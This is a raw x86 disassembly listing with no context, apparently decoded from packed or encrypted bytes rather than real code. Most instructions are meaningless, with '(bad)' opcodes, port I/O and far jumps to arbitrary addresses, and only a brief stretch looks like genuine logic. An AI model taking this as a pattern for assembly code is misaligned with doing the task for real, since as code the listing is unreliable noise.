  40cdb3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cdb4:	ins    DWORD PTR es:[edi],dx
  40cdb5:	inc    esi
  40cdb6:	inc    esp
  40cdb7:	call   0x71b5:0xb2ad9caf
  40cdbe:	lock stc 
  40cdc0:	mov    ch,0x2c
  40cdc2:	xor    esp,esi
  40cdc4:	adc    eax,0x8af943e4
  40cdc9:	aas    
  40cdca:	or     al,0x20
  40cdcc:	fdivr  QWORD PTR [edi+0x57b28e78]
  40cdd2:	popf   
  40cdd3:	add    al,0x7
  40cdd5:	push   0x3a8232c5
  40cdda:	loope  0x40cde6
  40cddc:	add    dh,dl
  40cdde:	(bad)  
  40cddf:	cli    
  40cde0:	jp     0x40cd6d
  40cde2:	imul   esi,DWORD PTR [esp+eax*4+0x77],0x1b52cb3c
  40cdea:	and    al,0x7b
  40cdec:	dec    esi
  40cded:	rcr    ebp,cl
  40cdef:	adc    al,0x85
  40cdf1:	cmc    
  40cdf2:	retf   0x6ea6
  40cdf5:	pop    esi
  40cdf6:	jnp    0x40cd7b
  40cdf8:	mov    ?,WORD PTR [eax+esi*4+0xbe6c6d8]
  40cdff:	pusha  
  40ce00:	xchg   ebx,eax
  40ce01:	push   eax
  40ce02:	in     al,dx
  40ce03:	and    eax,0x14760eee
  40ce08:	sbb    DWORD PTR [edi+ecx*2-0x61],ecx
  40ce0c:	call   0xd232759f
  40ce11:	stos   BYTE PTR es:[edi],al
  40ce12:	(bad)  
  40ce13:	jp     0x40ce2d
  40ce15:	inc    esp
  40ce16:	adc    al,0x64
  40ce18:	jecxz  0x40cdae
  40ce1a:	daa    
  40ce1b:	rcr    DWORD PTR [ebp-0x60c4dab3],1
  40ce21:	sub    ebp,DWORD PTR [eax+0x1d]
  40ce24:	xchg   ebx,eax
  40ce25:	mov    esp,0x9e8b3a10
  40ce2a:	inc    edi
  40ce2b:	adc    bl,ah
  40ce2d:	or     eax,0x47e0ec14
  40ce32:	and    eax,ecx
  40ce34:	repz pop ds
  40ce36:	pop    ss
  40ce37:	ins    BYTE PTR es:[edi],dx
  40ce38:	mov    ebp,0x4e803c3b
  40ce3d:	loop   0x40cdc3
  40ce3f:	les    ebp,FWORD PTR [eax]
  40ce41:	out    0x91,eax
  40ce43:	cld    
  40ce44:	sar    BYTE PTR [ebx],cl
  40ce46:	gs retf 
  40ce48:	in     eax,dx
  40ce49:	mov    ch,0xd7
  40ce4b:	ficom  WORD PTR [edx-0x54f3d68a]
  40ce51:	pop    ebx
  40ce52:	jecxz  0x40ce9b
  40ce54:	sbb    eax,DWORD PTR [edx+0x2ad514d2]
  40ce5a:	jle    0x40cea5
  40ce5c:	scas   al,BYTE PTR es:[edi]
  40ce5d:	nop
  40ce5e:	mov    edx,0x9fc98ae5
  40ce63:	or     dh,BYTE PTR [edi+0x6a191d9a]
  40ce69:	mov    eax,ds:0xd34b626f
  40ce6e:	and    DWORD PTR [esi+ecx*4-0x7c],esi
  40ce72:	pop    ds
  40ce73:	fiadd  WORD PTR ss:[ecx+0x5c8d48ac]
  40ce7a:	xor    DWORD PTR [edx-0x5f],ebx
  40ce7d:	xor    BYTE PTR [ecx+0x32],ch
  40ce80:	jecxz  0x40cecd
  40ce82:	and    BYTE PTR [ebp+0x6bec8f44],ah
  40ce88:	outs   dx,DWORD PTR ds:[esi]
  40ce89:	mov    esp,ebx
  40ce8b:	cdq    
  40ce8c:	mov    BYTE PTR [esi+0x14387812],ch
  40ce92:	in     al,0x93
  40ce94:	push   edx
  40ce95:	mov    bl,0x28
  40ce97:	push   DWORD PTR [ebx]
  40ce99:	ss mov bl,0x56
  40ce9c:	add    eax,0x7eae5d8
  40cea1:	int3   
  40cea2:	cs sbb al,0x75
  40cea5:	ret    
  40cea6:	fsub   DWORD PTR [edi+edx*8-0x15]
  40ceaa:	sti    
  40ceab:	ror    BYTE PTR [ecx-0x3e7ffcd9],0xc8
  40ceb2:	mov    WORD PTR [esi+0x2a3ea9f],ds
  40ceb8:	cmp    DWORD PTR [ecx-0x6a],edx
  40cebb:	sbb    al,0xe4
  40cebd:	enter  0x747f,0xc3
  40cec1:	mov    sp,0x5ba5
  40cec5:	fwait
  40cec6:	jae    0x40ce65
  40cec8:	or     BYTE PTR [edi+0x40],0x54
  40cecc:	dec    esp
  40cecd:	dec    edx
  40cece:	inc    ecx
  40cecf:	add    ch,BYTE PTR [eax]
  40ced1:	lods   eax,DWORD PTR ds:[esi]
  40ced2:	test   eax,0xd9245e16
  40ced7:	out    0x83,al
  40ced9:	dec    ebx
  40ceda:	xor    eax,0xffffffbe
  40cedd:	out    0x68,al
  40cedf:	daa    
  40cee0:	adc    ebx,DWORD PTR [edx+0x42fa0047]
  40cee6:	(bad)  
  40cee7:	fisub  WORD PTR ds:0x367540d
  40ceee:	mov    ah,0xfd
  40cef0:	aaa    
  40cef1:	into   
  40cef2:	nop
  40cef3:	js     0x40ceb3
  40cef5:	jp     0x40ce82
  40cef7:	out    dx,eax
  40cef8:	sub    eax,0x127ac58c
  40cefd:	loopne 0x40cee1
  40ceff:	sub    al,0x5a
  40cf01:	out    dx,eax
  40cf02:	fisttp WORD PTR [esi+0x3a6ed0c8]
  40cf08:	and    BYTE PTR ds:0x6930dd4,dl
  40cf0e:	sbb    eax,0x5d786901
  40cf13:	repz and eax,0xbcec4ea4
  40cf19:	in     al,dx
  40cf1a:	xchg   ecx,eax
  40cf1b:	xlat   BYTE PTR ds:[ebx]
  40cf1c:	add    DWORD PTR ds:0x1731ed9e,ebp
  40cf22:	sbb    esi,DWORD PTR [ebp+0x1b6f2df8]
  40cf28:	mov    BYTE PTR [esi-0x7a7d59cf],ch
  40cf2e:	push   ecx
  40cf2f:	ss mov edx,0x37f731a7
  40cf35:	and    al,0xb1
  40cf37:	jge    0x40cec4
  40cf39:	mov    esp,0x4656bb02
  40cf3e:	retf   0xe002
  40cf41:	adc    BYTE PTR [edx+0x7f],ch
  40cf44:	imul   ebx,DWORD PTR [ebx-0x32a5646],0x5d
  40cf4b:	mov    ds:0x2d00487a,eax
  40cf50:	cmp    BYTE PTR [ebx-0x48],dl
  40cf53:	sbb    eax,0x7fea92c4
  40cf58:	mov    bl,0x90
  40cf5a:	fistp  QWORD PTR [edx]
  40cf5c:	xor    DWORD PTR [edx],0xffffffdf
  40cf5f:	fisubr DWORD PTR [edx+eax*8-0x6427ff66]
  40cf66:	dec    eax
  40cf67:	rep lods al,BYTE PTR ds:[esi]
  40cf69:	cmp    eax,DWORD PTR [esi-0x1a]
  40cf6c:	sub    BYTE PTR [esi],bl
  40cf6e:	lea    ebx,ds:0xae4fa4c6
  40cf74:	push   esi
  40cf75:	dec    edi
  40cf76:	or     esi,DWORD PTR [edx-0x71]
  40cf79:	fisubr DWORD PTR [ecx-0x31fe5182]
  40cf7f:	fmul   QWORD PTR [ebp-0x793d56f1]
  40cf85:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cf86:	xchg   edi,eax
  40cf87:	xchg   edx,eax
  40cf88:	mov    eax,DWORD PTR [esp+eiz*4-0xa]
  40cf8c:	jp     0x40cf28
  40cf8e:	clc    
  40cf8f:	dec    ecx
  40cf90:	xchg   ebp,eax
  40cf91:	popf   
  40cf92:	mov    ?,WORD PTR [ebx]
  40cf94:	into   
  40cf95:	dec    esp
  40cf96:	cmc    
  40cf97:	lahf   
  40cf98:	jns    0x40cf34
  40cf9a:	jmp    0x40cff6
  40cf9c:	jge    0x40cfe0
  40cf9e:	pop    esi
  40cf9f:	xchg   esp,esi
  40cfa1:	cmp    DWORD PTR fs:[edx+0x18],esi
  40cfa5:	cmp    eax,0xd1a5bc82
  40cfaa:	outs   dx,BYTE PTR ds:[esi]
  40cfab:	cwde   
  40cfac:	outs   dx,DWORD PTR ds:[esi]
  40cfad:	data16 jo 0x40d02a
  40cfb0:	mov    ah,0xda
  40cfb2:	push   edx
  40cfb3:	adc    ebx,ebx
  40cfb5:	adc    al,0x91
  40cfb7:	das    
  40cfb8:	or     DWORD PTR [ebp+0x50],esp
  40cfbb:	fsubr  DWORD PTR [ecx+0x2118b638]
  40cfc1:	dec    edx
  40cfc2:	or     dh,0x10
  40cfc5:	ins    DWORD PTR es:[edi],dx
  40cfc6:	mov    ah,0xff
  40cfc8:	jbe    0x40cf75
  40cfca:	push   ecx
  40cfcb:	mov    bh,0x92
  40cfcd:	sbb    BYTE PTR [ecx+0x285b9272],dh
  40cfd3:	ret    
  40cfd4:	fidiv  DWORD PTR [ecx-0x4b]
  40cfd7:	inc    ecx
  40cfd8:	push   edi
  40cfd9:	repz push ebp
  40cfdb:	(bad)  
  40cfdc:	stos   BYTE PTR es:[edi],al
  40cfdd:	jge    0x40d028
  40cfdf:	add    eax,0x3a49ecfd
  40cfe4:	ret    0xeb0e
  40cfe7:	addr16 aaa 
  40cfe9:	arpl   WORD PTR [ecx-0xa89512],ax
  40cfef:	aam    0xed
  40cff1:	jne    0x40cf82
  40cff3:	arpl   si,sp
  40cff5:	and    dl,BYTE PTR [edi+0x96bc4ab]
  40cffb:	push   edx
  40cffc:	jp     0x40cfc3
  40cffe:	mov    ebx,0x8f1d607f
  40d003:	bound  edi,QWORD PTR [ebx]
  40d005:	jmp    0x70f47478
  40d00a:	mov    ebx,0xcf569a6b
  40d00f:	pop    ebx
  40d010:	jns    0x40cfd8
  40d012:	xchg   ecx,eax
  40d013:	cmp    edx,ecx
  40d015:	lods   al,BYTE PTR ds:[esi]
  40d016:	mov    eax,0x4a982016
  40d01b:	loope  0x40cfe5
  40d01d:	mov    eax,0x19447f75
  40d022:	pop    ebp
  40d023:	inc    edi
  40d024:	pop    ds
  40d025:	sbb    BYTE PTR [edx-0x52],bl
  40d028:	cwde   
  40d029:	into   
  40d02a:	xor    BYTE PTR [ecx+edi*8],dl
  40d02d:	(bad)  [eax+0x1613aeb1]
  40d033:	mov    ch,0x23
  40d035:	or     eax,0xd6468ce8
  40d03a:	fcmovnbe st,st(0)
  40d03c:	data16 jp 0x40cfd6
  40d03f:	stc    
  40d040:	aad    0xcf
  40d042:	stos   BYTE PTR es:[edi],al
  40d043:	cmp    al,0x98
  40d045:	ins    BYTE PTR es:[edi],dx
  40d046:	and    BYTE PTR [eax+0x6286ed06],dl
  40d04c:	ja     0x40cfe7
  40d04e:	mov    BYTE PTR [edi-0x141fda07],al
  40d054:	outs   dx,BYTE PTR ds:[esi]
  40d055:	cli    
  40d056:	scas   eax,DWORD PTR es:[edi]
  40d057:	aaa    
  40d058:	mov    al,0x8
  40d05a:	or     dl,al
  40d05c:	push   esp
  40d05d:	jnp    0x40d0c1
  40d05f:	stos   DWORD PTR es:[edi],eax
  40d060:	push   0x50ec8317
  40d065:	int3   
  40d066:	loop   0x40d09f
  40d068:	and    ch,BYTE PTR [edx]
  40d06a:	scas   al,BYTE PTR es:[edi]
  40d06b:	pop    esp
  40d06c:	jmp    DWORD PTR [edi]
  40d06e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d06f:	mov    ebx,0xcdef2a0b
  40d074:	lea    esi,[ebp+0xafed313]
  40d07a:	test   eax,0x814d741
  40d07f:	mov    bh,0x88
  40d081:	pop    edi
  40d082:	aad    0xb3
  40d084:	and    ecx,edi
  40d086:	adc    BYTE PTR [eax+ecx*8-0x1db70cb0],ch
  40d08d:	mov    ds:0xed7055c4,al
  40d092:	or     BYTE PTR [ebp-0x35],bh
  40d095:	push   es
  40d096:	and    al,0x30
  40d098:	mov    BYTE PTR [esi-0x1b],dl
  40d09b:	shl    BYTE PTR [edi+eax*2],cl
  40d09e:	xchg   edi,eax
  40d09f:	into   
  40d0a0:	mov    cl,0x42
  40d0a2:	das    
  40d0a3:	xor    eax,0x2a8d0b36
  40d0a9:	imul   DWORD PTR [ecx-0x4bf70bf4]
  40d0af:	jnp    0x40d0e5
  40d0b1:	popf   
  40d0b2:	call   0x75069da4
  40d0b7:	and    eax,0xb336c9da
  40d0bc:	sbb    BYTE PTR [ebp+0x4d],0xc4
  40d0c0:	ret    0xe09
  40d0c3:	icebp  
  40d0c4:	test   ebx,edx
  40d0c6:	lods   eax,DWORD PTR ds:[esi]
  40d0c7:	or     eax,0x2d502e6b
  40d0cc:	fcom   QWORD PTR [edi+0x4de1ac14]
  40d0d2:	cmp    DWORD PTR [ebp-0x5a48c398],esi
  40d0d8:	xor    eax,esi
  40d0da:	xor    DWORD PTR ds:0x42a296,0x42a2e6
  40d0e4:	add    eax,edi
  40d0e6:	mov    DWORD PTR ds:0x42a2ce,0x1ae8
  40d0f0:	cmp    ecx,eax
  40d0f2:	je     0x413d1d
  40d0f8:	xor    DWORD PTR ds:0x42a26e,0x42a2e6
  40d102:	push   DWORD PTR [ebp-0x14]
  40d105:	push   DWORD PTR [ebp+0x8]
  40d108:	call   0x4250bb
  40d10d:	sub    DWORD PTR ds:0x42a266,edi
  40d113:	jmp    0x40f48f
  40d118:	scas   eax,DWORD PTR es:[edi]
  40d119:	cdq    
  40d11a:	and    DWORD PTR [ebx],edx
  40d11c:	add    DWORD PTR [ebx+0x10ba9981],ecx
  40d122:	cwde   
  40d123:	int    0xd2
  40d125:	mov    ecx,0xccd27794
  40d12a:	add    DWORD PTR [ebx-0x7c7ca1de],0xffffffde
  40d131:	mov    ah,BYTE PTR [eax]
  40d133:	ins    DWORD PTR es:[edi],dx
  40d134:	cwde   
  40d135:	mov    esp,0x6fe815e2
  40d13a:	out    0x7d,eax
  40d13c:	mov    bl,al
  40d13e:	or     DWORD PTR [edi+esi*2-0x3d],eax
  40d142:	test   DWORD PTR [ebx-0x33],edi
  40d145:	ja     0x40d153
  40d147:	or     BYTE PTR [edx-0x6406c79d],dh
  40d14d:	fwait
  40d14e:	popa   
  40d14f:	xor    DWORD PTR [eax+0x36],esi
  40d152:	ss adc al,0xe0
  40d155:	mov    eax,0x3209f108
  40d15a:	jbe    0x40d110
  40d15c:	adc    al,0x70
  40d15e:	and    ah,BYTE PTR [edi]
  40d160:	xchg   BYTE PTR [eax],dl
  40d162:	daa    
  40d163:	sbb    edx,edx
  40d165:	jmp    0x40d175
  40d167:	jle    0x40d153
  40d169:	or     eax,0x7b64c4a8
  40d16e:	mov    al,0x54
  40d170:	les    ebx,FWORD PTR [esi+0x50a84777]
  40d176:	xchg   esi,eax
  40d177:	mov    bl,0xf4
  40d179:	sbb    DWORD PTR [ebp-0x58a6f017],ecx
  40d17f:	les    eax,FWORD PTR [ecx+0x22ce3077]
  40d185:	cmp    eax,0x66c84dfe
  40d18a:	push   ebp
  40d18b:	retf   
  40d18c:	popf   
  40d18d:	stc    
  40d18e:	repz (bad) 
  40d190:	mov    ebx,0x743399c4
  40d195:	outs   dx,BYTE PTR ds:[esi]
  40d196:	div    BYTE PTR [ecx-0x18c1c7e9]
  40d19c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d19d:	push   esi
  40d19e:	xor    bl,BYTE PTR [eax]
  40d1a0:	push   ds
  40d1a1:	ror    DWORD PTR [edi-0x593c40d],0xe7
  40d1a8:	dec    edi
  40d1a9:	and    edi,DWORD PTR [edx]
  40d1ab:	xor    bl,BYTE PTR [edi]
  40d1ad:	shr    BYTE PTR [edi],1
  40d1af:	test   BYTE PTR ds:0x957a79e3,ch
  40d1b5:	add    al,0xdb
  40d1b7:	xchg   edx,eax
  40d1b8:	xlat   BYTE PTR ds:[ebx]
  40d1b9:	inc    esi
  40d1ba:	push   edi
  40d1bb:	(bad)  
  40d1bd:	adc    eax,0x7f408d5d
  40d1c2:	mov    gs,WORD PTR [ecx+0x1f98d9b4]
  40d1c8:	popa   
  40d1c9:	cdq    
  40d1ca:	mov    ?,ebp
  40d1cc:	sbb    DWORD PTR [edx-0x5],edi
  40d1cf:	lahf   
  40d1d0:	mov    al,ds:0x2feb2926
  40d1d5:	sbb    BYTE PTR [edi+0x68],bl
  40d1d8:	stos   DWORD PTR es:[edi],eax
  40d1d9:	jp     0x40d254
  40d1db:	jnp    0x40d16d
  40d1dd:	stos   DWORD PTR es:[edi],eax
  40d1de:	mov    eax,0x395756d0
  40d1e3:	mov    dh,0x71
  40d1e5:	shl    dh,1
  40d1e7:	pop    eax
  40d1e8:	sar    BYTE PTR [eax-0x60a33bbe],0xd8
  40d1ef:	push   ss
  40d1f0:	mov    ecx,DWORD PTR [edi+0x2d]
  40d1f3:	mov    eax,0xc9fe0e71
  40d1f8:	and    bh,BYTE PTR [edi+0x2]
  40d1fb:	in     al,0x2d
  40d1fd:	fmul   DWORD PTR [ebx*4+0x10e7cdde]
  40d204:	pusha  
  40d205:	fst    QWORD PTR [esi+0x41]
  40d208:	popf   
  40d209:	adc    eax,0xcee1fc3d
  40d20e:	jno    0x40d217
  40d210:	mov    ebp,0xf69ac4
  40d215:	hlt    
  40d216:	ins    BYTE PTR es:[edi],dx
  40d217:	loopne 0x40d270
  40d219:	xchg   esp,eax
  40d21a:	push   eax
  40d21b:	leave  
  40d21c:	sub    ch,dl
  40d21e:	push   ds
  40d21f:	std    
  40d220:	mov    ch,0x45
  40d222:	(bad)  
  40d223:	or     eax,0x7ca943ca
  40d228:	xchg   edi,edi
  40d22a:	setle  BYTE PTR [ecx-0x74]
  40d22e:	jnp    0x40d27c
  40d230:	dec    edi
  40d231:	fsub   DWORD PTR [eax+0x791d3ab]
  40d237:	ins    BYTE PTR es:[edi],dx
  40d238:	mov    DWORD PTR [esi],esi
  40d23a:	sbb    ah,BYTE PTR [esi]
  40d23c:	test   al,0xa5
  40d23e:	daa    
  40d23f:	push   cs
  40d240:	mov    edx,0x5f7848a5
  40d245:	and    dh,bl
  40d247:	mov    BYTE PTR [eax],cl
  40d249:	sub    edi,DWORD PTR [edx+ebx*2-0x77]
  40d24d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d24e:	loope  0x40d213
  40d250:	popa   
  40d251:	int    0x84
  40d253:	xchg   ebx,eax
  40d254:	dec    ecx
  40d255:	daa    
  40d256:	repnz or dh,dl
  40d259:	inc    ecx
  40d25a:	call   0x41725309
  40d25f:	out    0x7a,al
  40d261:	rol    BYTE PTR [edi+0x44],0x81
  40d265:	dec    DWORD PTR [eax+0x5d]
  40d268:	add    BYTE PTR [edx-0x5f],bh
  40d26b:	dec    esp
  40d26c:	lahf   
  40d26d:	mov    ecx,0x2787b728
  40d272:	pop    ebp
  40d273:	mov    DWORD PTR [eax+0x10123198],edx
  40d279:	or     DWORD PTR [ebx-0x18],esp
  40d27c:	mov    DWORD PTR [ebx],eax
  40d27e:	xchg   ebx,eax
  40d27f:	pop    esp
  40d280:	mov    bh,0xb4
  40d282:	clc    
  40d283:	sbb    edx,0xffffffd1
  40d286:	push   ss
  40d287:	mov    ds:0x8588f28c,eax
  40d28c:	mov    ebx,0xc7210b16
  40d291:	dec    ebx
  40d292:	jo     0x40d28a
  40d294:	mov    eax,0x36a52afc
  40d299:	push   edx
  40d29a:	stos   DWORD PTR es:[edi],eax
  40d29b:	xor    al,0x72
  40d29d:	jnp    0x40d29d
  40d29f:	cld    
  40d2a0:	mov    eax,0x5e8a41d5
  40d2a5:	retf   0x405b
  40d2a8:	test   dl,bh
  40d2aa:	iret   
  40d2ab:	xchg   DWORD PTR [ecx+0x29eb5817],ecx
  40d2b1:	jbe    0x40d24e
  40d2b3:	outs   dx,BYTE PTR ds:[esi]
  40d2b4:	mov    edi,0xc7f71678
  40d2b9:	sub    eax,0xb77db4a5
  40d2be:	(bad)  
  40d2bf:	push   0xdbc591d7
  40d2c4:	test   al,0xf1
  40d2c6:	mov    ecx,0xf193424b
  40d2cb:	push   cs
  40d2cc:	div    DWORD PTR [edi-0x4a]
  40d2cf:	lds    ebx,FWORD PTR [edx]
  40d2d1:	inc    esi
  40d2d2:	mov    bh,0xa
  40d2d4:	jge    0x40d32c
  40d2d6:	sub    BYTE PTR [ebp-0x11],bh
  40d2d9:	(bad)  
  40d2db:	jne    0x40d31c
  40d2dd:	aas    
  40d2de:	or     ecx,eax
  40d2e0:	arpl   WORD PTR [ebp-0xe],ax
  40d2e3:	ins    BYTE PTR es:[edi],dx
  40d2e4:	retf   0x654
  40d2e7:	mov    DWORD PTR [edi+edi*4+0x2],eax
  40d2eb:	jnp    0x40d2b5
  40d2ed:	test   BYTE PTR [edi-0x34d44fa1],dh
  40d2f3:	cli    
  40d2f4:	push   ds
  40d2f5:	and    al,0x61
  40d2f7:	mov    eax,ecx
  40d2f9:	jnp    0x40d2d0
  40d2fb:	fiadd  WORD PTR [ebx-0x3acd42a3]
  40d301:	pop    esi
  40d302:	(bad)  
  40d303:	cmp    eax,0x969ed29e
  40d308:	aas    
  40d309:	pop    ecx
  40d30a:	lods   al,BYTE PTR ds:[esi]
  40d30b:	ror    BYTE PTR [ebp-0x54],0xee
  40d30f:	push   ebp
  40d310:	data16 outs dx,BYTE PTR ds:[esi]
  40d312:	call   0x9ce2e12f
  40d317:	(bad)  
  40d318:	mov    eax,0x912ecf81
  40d31d:	pop    ds
  40d31e:	jns    0x40d2e9
  40d320:	mov    DWORD PTR [ebx],esp
  40d322:	lea    ebx,[eax+eax*4]
  40d325:	ss lock pop esp
  40d328:	mov    esp,0xa586b2ea
  40d32d:	jmp    0x1ec1:0xc4cd41d8
  40d334:	(bad)
  40d337:	push   0x2676aa6f
  40d33c:	mov    dh,0x76
  40d33e:	fwait
  40d33f:	mov    cl,0xb0
  40d341:	dec    ebp
  40d342:	cmp    esi,DWORD PTR [ebx-0x20]
  40d345:	dec    ebx
  40d346:	xchg   edi,eax
  40d347:	repnz int 0xd1
  40d34a:	pop    ebx
  40d34b:	xchg   esi,eax
  40d34c:	mov    eax,ebp
  40d34e:	stc    
  40d34f:	push   esi
  40d350:	sbb    bh,ch
  40d352:	add    esi,esp
  40d354:	dec    esp
  40d355:	xor    eax,DWORD PTR [edx]
  40d357:	sbb    al,BYTE PTR [eax+0x2f]
  40d35a:	icebp  
  40d35b:	test   al,0xfd
  40d35d:	adc    ecx,edx
  40d35f:	stc    
  40d360:	popa   
  40d361:	iret   
  40d362:	(bad)  
  40d363:	repnz stos BYTE PTR es:[edi],al
  40d365:	scas   al,BYTE PTR es:[edi]
  40d366:	ret    0x4e73
  40d369:	pop    edi
  40d36a:	push   ss
  40d36b:	or     al,0xd5
  40d36d:	fisttp QWORD PTR [eax+0x1acd6ad6]
  40d373:	and    BYTE PTR [ebx],dl
  40d375:	clc    
  40d376:	pop    ds
  40d377:	call   0x696e840f
  40d37c:	or     ah,BYTE PTR [esi+0x40]
  40d37f:	mov    ecx,0x7c9acb04
  40d384:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d385:	idiv   DWORD PTR [esi]
  40d387:	mov    eax,fs:0x504f8ba6
  40d38d:	xchg   ebx,eax
  40d38e:	pushf  
  40d38f:	jmp    0x2dfb3579
  40d394:	stc    
  40d395:	jecxz  0x40d328
  40d397:	nop
  40d398:	push   eax
  40d399:	push   es
  40d39a:	cmp    BYTE PTR [edx-0x6e],al
  40d39d:	arpl   WORD PTR [edi+edx*8-0x63c6a51],sp
  40d3a4:	stc    
  40d3a5:	inc    esi
  40d3a6:	scas   al,BYTE PTR es:[edi]
  40d3a7:	mov    dh,0x93
  40d3a9:	inc    ecx
  40d3aa:	stos   DWORD PTR es:[edi],eax
  40d3ab:	mov    BYTE PTR [ebx+0x17b73955],ch
  40d3b1:	ins    BYTE PTR es:[edi],dx
  40d3b2:	mov    eax,0x12f66eb8
  40d3b7:	repnz mov ebx,0xab702044
  40d3bd:	clc    
  40d3be:	dec    esi
  40d3bf:	inc    eax
  40d3c0:	mov    al,ds:0x2d36ef62
  40d3c5:	or     eax,0x95265e5c
  40d3ca:	inc    eax
  40d3cb:	mov    ch,0x3d
  40d3cd:	ss sbb esp,0x190ebf9
  40d3d4:	fs jnp 0x40d35e
  40d3d7:	fild   WORD PTR [ecx]
  40d3d9:	or     esi,DWORD PTR [edx+0x2e3d2a7]
  40d3df:	ret    
  40d3e0:	add    al,0xb8
  40d3e2:	mov    cl,dl
  40d3e4:	mov    ebx,0x3fa24628
  40d3e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d3ea:	leave  
  40d3eb:	fmul   QWORD PTR [ebp-0x23]
  40d3ee:	pusha  
  40d3ef:	mov    edx,0xd1f470e6
  40d3f4:	push   edx
  40d3f5:	aas    
  40d3f6:	cmc    
  40d3f7:	xchg   esp,eax
  40d3f8:	mov    DWORD PTR [ecx-0xd],ecx
  40d3fb:	jp     0x40d3ad
  40d3fd:	lahf   
  40d3fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d3ff:	and    eax,0x48b4c494
  40d404:	inc    esi
  40d405:	iret   
  40d406:	push   ebx
  40d407:	mov    dh,0x2d
  40d409:	or     cl,BYTE PTR [eax-0x54be732]
  40d40f:	jle    0x40d3ae
  40d411:	cs mov edx,0xb2d51427
  40d417:	dec    ecx
  40d418:	shl    DWORD PTR [ebx-0x4d],1
  40d41b:	mov    eax,0x40c03e67
  40d420:	mov    eax,ds:0xdb02efaa
  40d425:	sbb    DWORD PTR ds:0x2b8e8584,esp
  40d42b:	jmp    0x40d3bb
  40d42d:	stc    
  40d42e:	fs mov esp,0x8348a8f1
  40d434:	cmp    al,0x4a
  40d436:	iret   
  40d437:	and    eax,0xf8201c34
  40d43c:	add    al,0xa3
  40d43e:	lods   al,BYTE PTR ds:[esi]
  40d43f:	pop    esi
  40d440:	xor    BYTE PTR [edi],cl
  40d442:	fist   WORD PTR [edi-0x63ebe48]
  40d448:	sub    BYTE PTR [edi+0x4b],ch
  40d44b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d44c:	push   ds
  40d44d:	outs   dx,BYTE PTR ds:[esi]
  40d44e:	bound  ecx,QWORD PTR [esi+eax*1-0x42]
  40d452:	ds nop
  40d454:	push   esp
  40d455:	enter  0x25ea,0xce
  40d459:	fisttp WORD PTR [ecx]
  40d45b:	sbb    ecx,DWORD PTR ds:0x5ea0b7e6
  40d461:	mov    bh,bh
  40d463:	inc    eax
  40d464:	push   0x58e68083
  40d469:	push   eax
  40d46a:	pop    esi
  40d46b:	jecxz  0x40d4c1
  40d46d:	dec    ebp
  40d46e:	pop    ss
  40d46f:	sbb    ebp,DWORD PTR [esi-0x3a]
  40d472:	retf   
  40d473:	add    dl,dl
  40d475:	cld    
  40d476:	(bad)  [eax+eax*1]
  40d479:	or     al,0x19
  40d47b:	mov    al,0x86
  40d47d:	pop    ebx
  40d47e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d47f:	adc    DWORD PTR [edi+0x34],edi
  40d482:	mov    ecx,0xd83c89a9
  40d487:	xchg   edx,eax
  40d488:	xor    cl,bl
  40d48a:	sub    bh,BYTE PTR [edi]
  40d48c:	scas   eax,DWORD PTR es:[edi]
  40d48d:	mov    edi,esp
  40d48f:	jno    0x40d42b
  40d491:	mov    edx,0x8d7360f0
  40d496:	nop
  40d497:	loop   0x40d45b
  40d499:	das    
  40d49a:	dec    edi
  40d49b:	mov    edx,0x1fcfaa8c
  40d4a0:	push   edx
  40d4a1:	xor    al,0xf2
  40d4a3:	in     eax,0x54
  40d4a5:	sar    BYTE PTR gs:[ecx],1
  40d4a8:	enter  0x610a,0xa0
  40d4ac:	in     al,0xec
  40d4ae:	mov    esp,0x9e21a076
  40d4b3:	xlat   BYTE PTR ds:[ebx]
  40d4b4:	jnp    0x40d4b7
  40d4b6:	sub    eax,0x12be26d4
  40d4bb:	in     eax,0xcc
  40d4bd:	mov    ch,0x86
  40d4bf:	mov    eax,DWORD PTR [edi+0x20e62b29]
  40d4c5:	ins    BYTE PTR es:[edi],dx
  40d4c6:	or     cl,BYTE PTR ds:0x44bd2f5a
  40d4cc:	jmp    0xb1d23b2c
  40d4d1:	mov    ds:0xff50d814,eax
  40d4d6:	cmp    BYTE PTR [esi-0x18d7138b],0x12
  40d4dd:	ins    BYTE PTR es:[edi],dx
  40d4de:	arpl   dx,cx
  40d4e0:	loope  0x40d4f0
  40d4e2:	jns    0x40d49a
  40d4e4:	mov    bh,0x13
  40d4e6:	stc    
  40d4e7:	loopne 0x40d481
  40d4e9:	dec    edi
  40d4ea:	stc    
  40d4eb:	xchg   ecx,eax
  40d4ec:	cli    
  40d4ed:	jg     0x40d556
  40d4ef:	jae    0x40d49d
  40d4f1:	push   ecx
  40d4f2:	(bad)  
  40d4f3:	jecxz  0x40d4fe
  40d4f5:	fldenv [ecx-0x29792cbb]
  40d4fb:	outs   dx,DWORD PTR ds:[esi]
  40d4fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d4fd:	mov    DWORD PTR [eax],eax
  40d4ff:	sbb    ch,cl
  40d501:	push   ss
  40d502:	cmp    edi,ebp
  40d504:	jl     0x40d54c
  40d506:	jne    0x40d522
  40d508:	mov    esi,0x72fdf768
  40d50d:	sbb    al,0x10
  40d50f:	jmp    0x40d536
  40d511:	cdq    
  40d512:	push   eax
  40d513:	ror    DWORD PTR [esi+ebx*8],0xf5
  40d517:	jae    0x40d4d2
  40d519:	out    0x4a,al
  40d51b:	mov    esi,0x3a7261d6
  40d520:	inc    esi
  40d521:	cmp    bl,BYTE PTR [edx]
  40d523:	pop    edi
  40d524:	out    dx,eax
  40d525:	mov    cs:0xc9b5a632,eax
  40d52b:	jns    0x40d56d
  40d52d:	adc    ch,BYTE PTR [esi+0x2765220]
  40d533:	loope  0x40d51a
  40d535:	or     esi,DWORD PTR [esi-0x66]
  40d538:	jns    0x40d573
  40d53a:	(bad)  
  40d53c:	mov    ecx,0xf5f9f3a2
  40d541:	sbb    ch,BYTE PTR [ecx-0x4c]
  40d544:	bound  ebp,QWORD PTR [esi-0x59]
  40d547:	call   eax
